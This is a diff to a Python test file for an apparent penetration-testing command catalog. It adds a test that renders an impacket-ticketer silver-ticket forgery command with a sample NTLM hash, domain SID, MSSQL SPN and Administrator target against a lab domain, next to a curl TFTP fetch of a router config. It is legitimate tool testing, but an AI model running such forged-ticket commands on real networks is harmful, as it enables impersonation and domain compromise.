@@ -245,6 +245,26 @@ def test_tftp_get_file_is_hidden_from_the_generic_list_but_renders_with_a_path()
     assert argv == ["curl", "-s", "tftp://10.10.10.10/ciscortr.cfg"]
     assert command == "curl -s tftp://10.10.10.10/ciscortr.cfg"
 
+def test_silver_ticket_ticketer_renders_with_manually_supplied_fields():
+    # like DCSync/BloodHound next to it, this needs fields the operator
+    # gathers by hand (a cracked/dumped NTLM hash, the domain SID, an SPN,
+    # target group RIDs) so it stays out of the auto-populated list.
+    commands = {item["id"] for item in catalog.commands_for("ldap", 389)}
+    assert "ad-silver-ticket-ticketer" not in commands
+    item, command, argv = catalog.render("ad-silver-ticket-ticketer", {
+        "nthash": "ef699384c3285c54128a3ee1ddb1a0cc",
+        "domain_sid": "S-1-5-21-4088429403-1159899800-2753317549",
+        "domain": "signed.htb", "spn": "MSSQLSvc/DC01.signed.htb:1433",
+        "groups": "1105", "target_username": "Administrator",
+    })
+    assert item["tool"] == "impacket-ticketer"
+    assert argv == [
+        "impacket-ticketer", "-nthash", "ef699384c3285c54128a3ee1ddb1a0cc",
+        "-domain-sid", "S-1-5-21-4088429403-1159899800-2753317549",
+        "-domain", "signed.htb", "-spn", "MSSQLSvc/DC01.signed.htb:1433",
+        "-groups", "1105", "Administrator",
+    ]
+
 def test_current_auth_protocols_have_specific_reviewed_checks():
     expected = {
         ("smtp", 25, "tcp"): {"smtp-info", "smtp-default-audit"},
